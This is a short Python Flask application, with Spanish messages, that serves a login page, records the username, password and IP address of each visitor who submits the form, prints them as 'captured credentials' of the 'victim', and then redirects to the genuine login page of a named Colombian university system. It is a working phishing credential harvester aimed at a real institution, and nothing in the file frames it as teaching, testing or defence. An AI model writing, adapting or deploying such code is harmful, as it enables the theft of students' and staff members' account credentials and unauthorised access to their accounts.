from flask import Flask, request, redirect, send_from_directory
import datetime
import os

app = Flask(__name__)

@app.route('/')
def home():
    return send_from_directory('.', 'index.html')

@app.route('/', methods=['POST'])
def capturar_credenciales():
    usuario = request.form.get('usuario', '')
    clave = request.form.get('clave', '')
    
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    fecha = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    print("\n" + "="*60)
    print(f"🚨 ¡CREDENCIALES CAPTURADAS EXITOSAMENTE! 🚨")
    print(f"📅 Fecha y Hora: {fecha}")
    print(f"🌐 IP de la Víctima: {ip}")
    print(f"👤 Usuario / Documento: {usuario}")
    print(f"🔑 Contraseña: {clave}")
    print("="*60 + "\n")
    
    return redirect('https://sigedin.uniputumayo.edu.co/login', code=302)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)